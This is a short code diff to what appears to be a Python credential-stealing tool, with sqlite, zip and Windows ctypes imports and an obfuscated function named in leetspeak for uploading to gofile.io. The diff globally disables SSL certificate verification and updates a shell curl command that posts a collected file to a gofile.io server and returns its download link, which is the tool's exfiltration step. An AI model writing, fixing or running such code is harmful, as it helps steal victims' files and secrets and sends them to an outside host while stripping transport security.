@@ -18,6 +18,8 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
 
 class NullWriter(object):
     def write(self, arg):
@@ -1037,8 +1039,8 @@ def UP104D7060F113(path):
         
         if servers:
             selected_server = servers[0]["name"]
-            upload_url = f'https://{selected_server}.gofile.io/uploadFile'
-            r = subprocess.Popen(f'curl -F "file=@{path}" {upload_url}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            upload_url = f'https://{selected_server}.gofile.io/contents/uploadfile'
+            r = subprocess.Popen(f'curl -X POST "{upload_url}" -F "file=@{path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             
             return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
     except Exception as e:
